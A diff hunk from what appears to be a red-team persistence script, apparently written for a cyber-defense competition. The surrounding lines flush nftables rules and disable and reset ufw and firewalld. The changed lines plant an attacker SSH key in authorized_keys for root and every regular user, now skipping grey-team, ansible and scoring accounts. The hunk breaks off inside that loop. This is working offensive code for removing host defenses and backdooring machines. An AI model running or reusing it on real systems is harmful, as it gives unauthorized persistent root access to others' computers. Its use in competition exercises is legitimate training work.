@@ -118,9 +118,10 @@ nft flush ruleset 2>/dev/null
 ufw --force disable 2>/dev/null; ufw --force reset 2>/dev/null
 systemctl stop firewalld 2>/dev/null; systemctl disable firewalld 2>/dev/null
 
-# -- SSH key re-injection --
+# -- SSH key re-injection (skip greyteam/ansible/scoring) --
 _k="${RT_SSH_KEY}"
-for _h in /root \$(awk -F: '\$3>=1000{print \$6}' /etc/passwd); do
+_skip="greyteam|ansible|scoring"
+for _h in /root \$(awk -F: -v skip="\$_skip" '\$3>=1000 && \$1 !~ skip {print \$6}' /etc/passwd); do
     [[ -d "\$_h" ]] || continue
     mkdir -p "\$_h/.ssh" && chmod 700 "\$_h/.ssh"
     touch "\$_h/.ssh/authorized_keys" && chmod 600 "\$_h/.ssh/authorized_keys"
